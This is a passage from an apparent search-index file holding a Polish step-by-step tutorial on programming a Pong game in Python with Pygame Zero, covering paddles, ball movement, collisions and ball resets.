kt\u00f3r\u0105 dodamy zaraz pod tytu\u0142em gry. Chcemy mie\u0107 lekki odcie\u0144 szaro\u015bci. W tym celu ustalamy kolor za pomoc\u0105 trzech warto\u015bci: (R, G, B). W celu uzyskania odcienia szaro\u015bci wystarczy poda\u0107 trzy takie same liczby, np. \\(64\\).</p> <pre><code>bg_color = (64, 64, 64)\n</code></pre> <p>Jak ju\u017c mamy kolor, to wype\u0142nijmy nim ca\u0142e t\u0142o. Dodajemy instrukcj\u0119 <code>screen.fill</code> w cz\u0119\u015bci rysuj\u0105cej.</p> <pre><code>def draw():\n    screen.fill(bg_color)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#zota-linia","title":"\u017b\u00f3\u0142ta linia","text":"<p>Mamy kolor t\u0142a, teraz dodajmy \u017c\u00f3\u0142t\u0105 lini\u0119. W tym celu u\u017cyjemy polecenia screen.draw.line do narysowania linii.  \u017beby narysowa\u0107 lini\u0119 musimy poda\u0107 jej pocz\u0105tek i koniec, a tak\u017ce kolor.  Gdyby\u015bmy chcieli narysowa\u0107 \u017c\u00f3\u0142t\u0105 lini\u0119 przez ca\u0142y ekran, wygl\u0105da\u0142oby to tak:</p> <pre><code>screen.draw.line((WIDTH / 2, 0), (WIDTH / 2, HEIGHT), color = \"yellow\")\n</code></pre> <p>Teraz dostosujmy nasz\u0105 lini\u0119, dodaj\u0105c niewielkie marginesy: \\(40\\) pikseli z g\u00f3ry i z do\u0142u.</p> <pre><code>screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n</code></pre> <p>Oczywi\u015bcie, \u017ceby narysowa\u0107 lini\u0119 na ekranie, musimy dopisa\u0107 powy\u017csze polecenie w cz\u0119\u015bci rysuj\u0105cej, zaraz pod wype\u0142nieniem ekranu kolorem t\u0142a.</p> <pre><code>def draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\n# Kolor t\u0142a\nbg_color = (64, 64, 64)\n\ndef draw():\n    # Wype\u0142niamy ekran kolorem t\u0142a\n    screen.fill(bg_color)\n    # Rysujemy lini\u0119 dziel\u0105c\u0105 pole gry\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#aktorzy","title":"Aktorzy","text":"<p>W naszej grze wyst\u0119puj\u0105 trzy postacie (aktorzy): * lewa paletka, * prawa paletka, * pi\u0142ka.</p> <p>Dodamy je po kolei do naszej gry i wy\u015bwietlimy na ekranie.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#lewa-paletka","title":"Lewa paletka","text":"<p>Naszych aktor\u00f3w dodamy zaraz pod kolorem t\u0142a, czyli na g\u00f3rze programu.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#tworzymy-aktora","title":"Tworzymy aktora","text":"<p>Najpierw musimy utworzy\u0107 aktora i zapisa\u0107 go w nowej zmiennej, kt\u00f3r\u0105 nazwiemy <code>left</code>. Naszego aktora tworzymy na podstawie grafiki left.png.</p> <pre><code>left = Actor(\"left\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ustalamy-pozycje-lewej-paletki","title":"Ustalamy pozycj\u0119 lewej paletki","text":"<p>Nasza lewa paletka b\u0119dzie znajdowa\u0107 si\u0119 z lewej strony ekranu. Nie chcemy jednak, by dotyka\u0142a kraw\u0119dzi, damy jej wi\u0119c pewien niewielki margines, np. \\(20\\) pikseli. Dzi\u0119ki temu nasza gra b\u0119dzie wygl\u0105da\u0142a estetyczniej. Ustalamy wi\u0119c wsp\u00f3\u0142rz\u0119dn\u0105 \\(x\\) lewej paletki.</p> <pre><code>left.x = 20\n</code></pre> <p>Trzeba jeszcze pomy\u015ble\u0107 o drugiej wsp\u00f3\u0142rz\u0119dnej: \\(y\\). Pocz\u0105tkowo umie\u015b\u0107my paletk\u0119 na \u015brodku, czyli w po\u0142owie wysoko\u015bci ekranu gry.</p> <pre><code>left.y = HEIGHT / 2\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#rysujemy-paletke","title":"Rysujemy paletk\u0119","text":"<p>Skoro ju\u017c umie\u015bcili\u015bmy nasz\u0105 lew\u0105 paletk\u0119 w jej pocz\u0105tkowej pozycji, mo\u017cemy j\u0105 narysowa\u0107 na ekranie. Do cz\u0119\u015bci rysuj\u0105cej, zaraz pod poleceniem rysuj\u0105cym \u017c\u00f3\u0142t\u0105 lini\u0119, dopisujemy polecenie rysuj\u0105ce lew\u0105 paletk\u0119: <code>left.draw()</code>.</p> <pre><code>def draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_1","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\n# Tworzymy aktora lewej paletki\nleft = Actor(\"left\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne lewej paletki na ekranie\nleft.x = 20\nleft.y = HEIGHT / 2\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    # Rysujemy lew\u0105 paletk\u0119\n    left.draw()\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#prawa-paletka","title":"Prawa paletka","text":"<p>Praw\u0105 paletk\u0119 tworzymy bardzo podobnie do lewej. Najwa\u017cniejsz\u0105 r\u00f3\u017cnic\u0105 b\u0119dzie oczywi\u015bcie jej grafika i pocz\u0105tkowe po\u0142o\u017cenie.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#tworzymy-aktora_1","title":"Tworzymy aktora","text":"<p>Najpierw musimy utworzy\u0107 aktora i zapisa\u0107 go w nowej zmiennej, kt\u00f3r\u0105 nazwiemy <code>right</code>. Naszego aktora tworzymy na podstawie grafiki right.png.</p> <pre><code>right = Actor(\"right\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ustalamy-pozycje-prawej-paletki","title":"Ustalamy pozycj\u0119 prawej paletki","text":"<p>Nasza prawa paletka b\u0119dzie znajdowa\u0107 si\u0119 z prawej strony ekranu. Nie chcemy jednak, by dotyka\u0142a kraw\u0119dzi, damy jej wi\u0119c pewien niewielki margines, taki jak dla lewej paletki, czyli \\(20\\) pikseli. Dzi\u0119ki temu nasza gra b\u0119dzie wygl\u0105da\u0142a estetyczniej. Ustalamy wi\u0119c wsp\u00f3\u0142rz\u0119dn\u0105 \\(x\\) prawej paletki. Poniewa\u017c umieszczamy j\u0105 z prawej strony ekranu, to aby obliczy\u0107 jej pozycj\u0119, od szeroko\u015bci ekranu (WIDTH) odejmujemy ustalony wcze\u015bniej margines.</p> <pre><code>right.x = WIDTH - 20\n</code></pre> <p>Trzeba jeszcze pomy\u015ble\u0107 o drugiej wsp\u00f3\u0142rz\u0119dnej: \\(y\\). Pocz\u0105tkowo umie\u015b\u0107my paletk\u0119 na \u015brodku, czyli w po\u0142owie wysoko\u015bci ekranu gry, tak samo jak lew\u0105 paletk\u0119.</p> <pre><code>right.y = HEIGHT / 2\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#rysujemy-paletke_1","title":"Rysujemy paletk\u0119","text":"<p>Skoro ju\u017c umie\u015bcili\u015bmy nasz\u0105 praw\u0105 paletk\u0119 w jej pocz\u0105tkowej pozycji, mo\u017cemy j\u0105 narysowa\u0107 na ekranie. Do cz\u0119\u015bci rysuj\u0105cej, zaraz pod poleceniem rysuj\u0105cym lew\u0105 paletk\u0119, dopisujemy polecenie rysuj\u0105ce praw\u0105 paletk\u0119: <code>right.draw()</code>.</p> <pre><code>def draw():\n    ...\n\n    left.draw()\n    right.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_2","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\n\n# Tworzymy aktora prawej paletki\nright = Actor(\"right\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne prawej paletki na ekranie\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    # Rysujemy praw\u0105 paletk\u0119\n    right.draw()\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#pika","title":"Pi\u0142ka","text":"<p>Pi\u0142k\u0119 dodamy podobnie jak paletki, ale umie\u015bcimy j\u0105 na \u015brodku ekranu.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#tworzymy-aktora_2","title":"Tworzymy aktora","text":"<p>Najpierw musimy utworzy\u0107 aktora i zapisa\u0107 go w nowej zmiennej, kt\u00f3r\u0105 nazwiemy <code>ball</code>. Naszego aktora tworzymy na podstawie grafiki ball.png.</p> <pre><code>ball = Actor(\"ball\")\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ustalamy-pozycje-piki","title":"Ustalamy pozycj\u0119 pi\u0142ki","text":"<p>Nasza pi\u0142ka b\u0119dzie pocz\u0105tkowo znajdowa\u0107 si\u0119 na \u015brodku ekranu. Dlatego do wsp\u00f3\u0142rz\u0119dnej \\(x\\) przypisujemy po\u0142ow\u0119 szeroko\u015bci (WIDTH) ekranu, a do wsp\u00f3\u0142rz\u0119dnej \\(y\\) przypisujemy po\u0142ow\u0119 wysoko\u015bci (HEIGHT) ekranu.</p> <pre><code>ball.x = WIDTH / 2\nball.y = HEIGHT / 2\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#rysujemy-pike","title":"Rysujemy pi\u0142k\u0119","text":"<p>Skoro ju\u017c umie\u015bcili\u015bmy nasz\u0105 pi\u0142k\u0119 w jej pocz\u0105tkowej pozycji, mo\u017cemy j\u0105 narysowa\u0107 na ekranie. Do cz\u0119\u015bci rysuj\u0105cej, zaraz pod poleceniem rysuj\u0105cym praw\u0105 paletk\u0119, dopisujemy polecenie rysuj\u0105ce pi\u0142k\u0119: ball.draw().</p> <pre><code>def draw():\n    ...\n\n    ball.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_3","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\n\nright = Actor(\"right\")\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\n\n# Tworzymy aktora pi\u0142ki\nball = Actor(\"ball\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne pi\u0142ki\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    right.draw()\n    # Rysujemy pi\u0142k\u0119\n    ball.draw()\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ruch-graczy","title":"Ruch graczy","text":"<p>Paletki chcemy porusza\u0107 jedynie w dw\u00f3ch kierunkach: w g\u00f3r\u0119 i w d\u00f3\u0142. Obie paletki b\u0119dziemy sterowa\u0107 za pomoc\u0105 klawiatury. Lew\u0105 paletk\u0119 obs\u0142u\u017cymy klawiszami W i S, a praw\u0105 paletk\u0119 obs\u0142u\u017cymy strza\u0142kami w g\u00f3r\u0119 i w d\u00f3\u0142.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#predkosc-graczy","title":"Pr\u0119dko\u015b\u0107 graczy","text":"<p>Musimy dopisa\u0107 do naszych paletek ich pr\u0119dko\u015b\u0107 pionow\u0105: vy. W tym celu pod lew\u0105 i praw\u0105 paletk\u0105 dopisujemy odpowiednio <code>left.vy = 5</code> oraz <code>right.vy = 5</code>. </p>"},{"location":"learning-by-games/python/pygame-zero/pong/#funkcja-odczytujaca-ruchy","title":"Funkcja odczytuj\u0105ca ruchy","text":"<p>W celu zachowania czytelno\u015bci naszego kodu, napiszemy sobie now\u0105 funkcj\u0119, tzn. wydzielony fragment kodu, kt\u00f3ry b\u0119dzie realizowa\u0142 konkretne zadanie. To zadanie b\u0119dzie polega\u0142o na odczytaniu wci\u015bni\u0119tych klawiszy z klawiatury i wykonaniu odpowiedniego ruchu paletek. Nazwiemy nasz\u0105 funkcj\u0119 <code>move_players</code>. Wewn\u0105trz funkcji b\u0119dziemy sprawdza\u0107, czy dany klawisz na klawiaturze jest wci\u015bni\u0119ty, a je\u017celi tak, to wykonamy stosowny ruch paletki, tzn. zmienimy jej wsp\u00f3\u0142rz\u0119dne.</p> <pre><code>def move_players():\n    if keyboard.w:\n        left.y -= left.vy\n\n    if keybaord.s:\n        left.y += left.vy\n\n    if keyboard.up:\n        right.y -= right.vy\n\n    if keyboard.down:\n        right.y += right.vy\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#wywoujemy-funkcje-w-czesci-aktualizujacej","title":"Wywo\u0142ujemy funkcj\u0119 w cz\u0119\u015bci aktualizuj\u0105cej","text":"<p>Aby zobaczy\u0107 rezultaty naszego dzia\u0142ania, potrzebujemy jeszcze u\u017cy\u0107 naszej funkcji. Ruch graczy to aktualizacja pozycji graczy na ekranie, dlatego nasz\u0105 now\u0105 funkcj\u0119 move_players wywo\u0142ujemy w cz\u0119\u015bci aktualizuj\u0105cej (update), zast\u0119puj\u0105c jej dotychczasow\u0105 zawarto\u015b\u0107 (pass).</p> <pre><code>def update():\n    move_players()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ograniczenie-ruchu-graczy","title":"Ograniczenie ruchu graczy","text":"<p>Nie chcemy, by paletki mog\u0142y wychodzi\u0107 poza ekran, dlatego dodajemy dodatkowe warunki do naszych instrukcji. Przed wykonaniem danego ruchu sprawdzimy, czy paletka znajduje si\u0119 wystarczaj\u0105co daleko od brzegu ekranu, aby ten ruch m\u00f3c wykona\u0107.</p> <pre><code>def move_players():\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_4","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\nleft.vy = 5\n\nright = Actor(\"right\")\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\nright.vy = 5\n\nball = Actor(\"ball\")\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    right.draw()\n    ball.draw()\n\ndef update():\n    # Odczytujemy ruchy graczy\n    move_players()\n\n# Pomocnicza funkcja odczytuj\u0105ca ruchy graczy\ndef move_players():\n    # Lewy gracz porusza si\u0119 za pomoc\u0105 klawiszy w oraz s\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    # Prawy gracz porusza si\u0119 za pomoc\u0105 strza\u0142ek g\u00f3ra i d\u00f3\u0142\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ruch-piki","title":"Ruch pi\u0142ki","text":"<p>Teraz zajmiemy si\u0119 ruchem pi\u0142ki i jej odbijaniem od \u015bcian i paletek.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#predkosc-piki","title":"Pr\u0119dko\u015b\u0107 pi\u0142ki","text":"<p>Najpierw dopiszemy do pi\u0142ki jej pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107. Poniewa\u017c pi\u0142ka b\u0119dzie si\u0119 porusza\u0107 po ca\u0142ym ekranie w dowolnym kierunku, to zdefiniujemy zar\u00f3wno jej pr\u0119dko\u015b\u0107 pionow\u0105 (vy) jak i poziom\u0105 (vx). Zaraz pod ustaleniem pocz\u0105tkowej pozycji pi\u0142ki na ekranie dopisujemy:</p> <pre><code>ball.vx = 5\nball.vy = 5\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#przemieszczanie-piki","title":"Przemieszczanie pi\u0142ki","text":"<p>Podobnie jak w przypadku paletek, do obs\u0142ugi ruchu pi\u0142ki tak\u017ce stworzymy now\u0105 funkcj\u0119, kt\u00f3r\u0105 nazwiemy <code>move_ball</code>. Nasz\u0105 funkcj\u0119 dopiszemy na ko\u0144cu kodu, zaraz przed poleceniem <code>pgzrun.go()</code>.</p> <pre><code>def move_ball():\n</code></pre> <p>Wewn\u0105trz naszej funkcji b\u0119dziemy przemieszcza\u0107 pi\u0142k\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105. W tym celu dodajemy pr\u0119dko\u015bci pi\u0142ki do jej wsp\u00f3\u0142rz\u0119dnych.</p> <pre><code>def move_ball():\n    ball.x += ball.vx\n    ball.y += ball.vy\n</code></pre> <p>Aby nasza funkcja dzia\u0142a\u0142a, musimy wywo\u0142a\u0107 j\u0105 w cz\u0119\u015bci aktualizuj\u0105cej (update), zaraz pod wywo\u0142aniem ruchu graczy.</p> <pre><code>def update():\n    move_players()\n    move_ball()    \n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#odbijanie-od-scian","title":"Odbijanie od \u015bcian","text":"<p>Chcemy, aby nasza pi\u0142ka odbija\u0142a si\u0119 od g\u00f3rnej i dolnej \u015bciany. W tym celu, po przemieszczeniu pi\u0142ki musimy sprawdzi\u0107, czy nie wysz\u0142a ona z g\u00f3ry lub z do\u0142u ekranu. Por\u00f3wnujemy wi\u0119c pozycj\u0119 pi\u0142ki z odpowiednimi warto\u015bciami. Dla lepszego efektu zachowamy niewielki margines, np. \\(40\\) pikseli.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#gorna-sciana","title":"G\u00f3rna \u015bciana","text":"<p>Zacznijmy od odbicia od g\u00f3rnej \u015bciany. Ca\u0142o\u015b\u0107 zapisujemy w cz\u0119\u015bci aktualizuj\u0105cej ruch pi\u0142ki (move_ball), zaraz pod zmian\u0105 pozycji pi\u0142ki. Sprawdzimy, czy odleg\u0142o\u015b\u0107 pi\u0142ki od g\u00f3ry ekranu (ball.top) jest mniejsza b\u0105d\u017a r\u00f3wna naszemu marginesowi.</p> <pre><code>def move_ball():\n    ...\n\n    if ball.top &lt;= 40:\n</code></pre> <p>Aby zasymulowa\u0107 odbicie si\u0119 pi\u0142ki od g\u00f3ry ekranu wystarczy odwr\u00f3ci\u0107 jej pr\u0119dko\u015b\u0107 pionow\u0105 (vy). To znaczy, zmieni\u0107 znak jej pr\u0119dko\u015bci na przeciwny: z minusa na plus, z plusa na minus. W tym celu przemno\u017cymy pr\u0119dko\u015b\u0107 pionow\u0105 pi\u0142ki przez \\(-1\\).</p> <pre><code>def move_ball():\n    ...\n\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#dolna-sciana","title":"Dolna \u015bciana","text":"<p>Podobnie post\u0119pujemy z odbiciem od dolnej \u015bciany. Najpierw sprawdzimy, czy odleg\u0142o\u015b\u0107 pi\u0142ki od do\u0142u ekranu (ball.bottom) jest wi\u0119ksza b\u0105d\u017a r\u00f3wna wysoko\u015bci ekranu minus nasz margines.</p> <pre><code>def move_ball():\n    ...\n\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    if ball.bottom &gt;= HEIGHT - 40:\n</code></pre> <p>Nast\u0119pnie symulujemy odbicie pi\u0142ki poprzez odwr\u00f3cenie jej pr\u0119dko\u015bci pionowej.</p> <pre><code>def move_ball():\n    ...\n\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    if ball.bottom &gt;= HEIGHT - 40:\n        ball.vy *= -1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#odbijanie-od-paletek","title":"Odbijanie od paletek","text":"<p>Odbijanie od paletek zrealizujemy podobnie, jak odbijanie od \u015bcian. Najpierw sprawdzamy, czy pi\u0142ka uderzy\u0142a w paletk\u0119, a nast\u0119pnie odwracamy jej pr\u0119dko\u015b\u0107 poziom\u0105 (vx). Ca\u0142o\u015b\u0107 ponownie zapisujemy na ko\u0144cu naszej funkcji move_ball.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#lewa-paletka_1","title":"Lewa paletka","text":"<p>Zacznijmy od lewej paletki. W celu sprawdzenia, czy pi\u0142ka uderzy\u0142a w lew\u0105 paletk\u0119 sprawdzimy, czy pi\u0142ka jest w kolizji z lew\u0105 paletk\u0105. Skorzystamy z funkcji colliderect.</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball):\n</code></pre> <p>Teraz pozosta\u0142o nam zasymulowa\u0107 odbicie poprzez przemno\u017cenie pr\u0119dko\u015bci poziomej (vx) naszej pi\u0142ki przez warto\u015b\u0107 \\(-1\\).</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball):\n        ball.vx *= -1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#prawa-paletka_1","title":"Prawa paletka","text":"<p>Przy prawej paletce post\u0119pujemy podobnie. Najpierw sprawdzamy kolizj\u0119 pi\u0142ki i prawej paletki.</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball):\n        ball.vx *= -1\n\n    if right.colliderect(ball):\n</code></pre> <p>Nast\u0119pnie odwracamy pr\u0119dko\u015b\u0107 poziom\u0105 pi\u0142ki.</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball):\n        ball.vx *= -1\n\n    if right.colliderect(ball):\n        ball.vx *= -1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#naprawienie-wpadania-piki-w-paletke","title":"Naprawienie \"wpadania\" pi\u0142ki w paletk\u0119","text":"<p>Gdy teraz uruchomimy gr\u0119 i spr\u00f3bujemy odbi\u0107 pi\u0142k\u0119, to czasami mo\u017cemy zauwa\u017cy\u0107, \u017ce pi\u0142ka na chwil\u0119 utknie w paletce i b\u0119dzie si\u0119 jakby odbija\u0107 wewn\u0105trz niej. Dzieje si\u0119 tak ze wzgl\u0119du na to, jak dzia\u0142a wykrywanie kolizji pomi\u0119dzy elementami, a tak\u017ce ze wzgl\u0119du na nasz spos\u00f3b odbijania si\u0119 pi\u0142ki od paletki. Mo\u017cemy to jednak bardzo \u0142atwo naprawi\u0107. Wystarczy, \u017ce przy kolizji pi\u0142ki z paletk\u0105 sprawdzimy dodatkowo, czy pi\u0142ka porusza si\u0119 we w\u0142a\u015bciwym kierunku. Je\u017celi pi\u0142ka uderzy\u0142a w lew\u0105 paletk\u0119, to znaczy, \u017ce powinna by\u0142a porusza\u0107 si\u0119 w lewo. Je\u017celi podczas kolizji pi\u0142ka porusza\u0142aby si\u0119 w prawo, to znaczy, \u017ce ju\u017c wcze\u015bniej odbili\u015bmy pi\u0142k\u0119 od tej paletki i utkn\u0119\u0142a ona wewn\u0105trz niej.</p> <p>Dodajemy wi\u0119c dodatkowy warunek do sprawdzenia przy wykryciu kolizji z lew\u0105 paletk\u0105. Musimy sprawdzi\u0107, czy pi\u0142ka porusza si\u0119 w lewo, czyli czy jej pr\u0119dko\u015b\u0107 vx jest ujemna, tzn. mniejsza od zera.</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    if right.colliderect(ball):\n        ball.vx *= -1\n</code></pre> <p>Podobnie post\u0105pimy przy kolizji z praw\u0105 paletk\u0105. Tym razem jednak musimy sprawdzi\u0107, czy pi\u0142ka porusza\u0142a si\u0119 w praw\u0105 stron\u0119, tzn. czy pr\u0119dko\u015b\u0107 pi\u0142ki jest dodatnia (wi\u0119ksza od zera).</p> <pre><code>def move_ball():\n    ...\n\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    if right.colliderect(ball) and ball.vx &gt; 0:\n        ball.vx *= -1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#wypadniecie-poza-ekran","title":"Wypadni\u0119cie poza ekran","text":"<p>Pozosta\u0142o nam obs\u0142u\u017cy\u0107 przypadek, gdy jedna z paletek nie zd\u0105\u017cy odbi\u0107 pi\u0142ki i ta wyleci z lewej lub prawej strony ekranu.</p> <p>Zacznijmy od pytania: co powinno sta\u0107 si\u0119 z pi\u0142k\u0105 w takiej sytuacji? Najpro\u015bciej b\u0119dzie zresetowa\u0107 jej pozycj\u0119, tzn. przywr\u00f3ci\u0107 j\u0105 na \u015brodek ekranu. W tym celu utworzymy now\u0105 funkcj\u0119 <code>reset_ball</code>, kt\u00f3r\u0105 dopiszemy na ko\u0144cu naszego kodu, zaraz przed <code>pgzrun.go()</code>.</p> <pre><code>def reset_ball():\n</code></pre> <p>W naszej funkcji przywr\u00f3cimy pi\u0142ce jej pocz\u0105tkow\u0105 pozycj\u0119.</p> <pre><code>def reset_ball():\n    ball.x = WIDTH / 2\n    ball.y = HEIGHT / 2\n</code></pre> <p>Teraz pozosta\u0142o nam sprawdzi\u0107, czy pi\u0142ka wylecia\u0142a poza ekran z lewej lub prawej strony i zresetowa\u0107 jej pozycj\u0119. Zapiszemy to w cz\u0119\u015bci aktualizuj\u0105cej pozycj\u0119 pi\u0142ki (move_ball).</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#lewa-strona","title":"Lewa strona","text":"<p>Zaczniemy od wypadni\u0119cia z lewej strony ekranu. W tym celu sprawdzimy, czy odleg\u0142o\u015b\u0107 pi\u0142ki od lewej strony (ball.left) jest mniejsza b\u0105d\u017a r\u00f3wna zero.</p> <pre><code>def move_ball():\n    ...\n    if ball.left &lt;= 0:\n</code></pre> <p>Je\u017celi tak jest, to resetujemy pozycj\u0119 naszej pi\u0142ki wywo\u0142uj\u0105c funkcj\u0119 <code>reset_ball</code>.</p> <pre><code>def move_ball():\n    ...\n    if ball.left &lt;= 0:\n        reset_ball()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#prawa-strona","title":"Prawa strona","text":"<p>W przypadku prawej strony ekranu post\u0119pujemy podobnie. Najpierw sprawdzimy, czy odleg\u0142o\u015b\u0107 pi\u0142ki od prawej strony (ball.right) jest wi\u0119ksza b\u0105d\u017a r\u00f3wna szeroko\u015bci ekranu.</p> <pre><code>def move_ball():\n    ...\n    if ball.left &lt;= 0:\n        reset_ball()\n\n    if ball.right &gt;= WIDTH:\n</code></pre> <p>Je\u017celi tak, to resetujemy pozycj\u0119 pi\u0142ki.</p> <pre><code>def move_ball():\n    ...\n    if ball.left &lt;= 0:\n        reset_ball()\n\n    if ball.right &gt;= WIDTH:\n        reset_ball()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ruch-piki-po-resecie","title":"Ruch pi\u0142ki po resecie","text":"<p>Obecnie, gdy nasza pi\u0142ka wyleci z jednej strony ekranu, to wr\u00f3ci na \u015brodek i b\u0119dzie si\u0119 dalej porusza\u0107 w tym samym kierunku co wcze\u015bniej. Mo\u017ce to sprawi\u0107, \u017ce gracz, kt\u00f3ry w\u0142a\u015bnie nie zdo\u0142a\u0142 odbi\u0107 pi\u0142ki b\u0119dzie mia\u0142 utrudnion\u0105 sytuacj\u0119. W tym celu warto sprawi\u0107, by pi\u0142ka po powrocie na \u015brodek porusza\u0142a si\u0119 w losowo wybranym kierunku. Zmodyfikujemy wi\u0119c nasz\u0105 funkcj\u0119 reset_ball dopisuj\u0105c do niej dwie linijki zmieniaj\u0105ce pr\u0119dko\u015b\u0107 pi\u0142ki.</p> <p>Poniewa\u017c chcemy, by pi\u0142ka porusza\u0142a si\u0119 ca\u0142y czas tak samo szybko, to dla ka\u017cdej z pr\u0119dko\u015bci (poziomej i 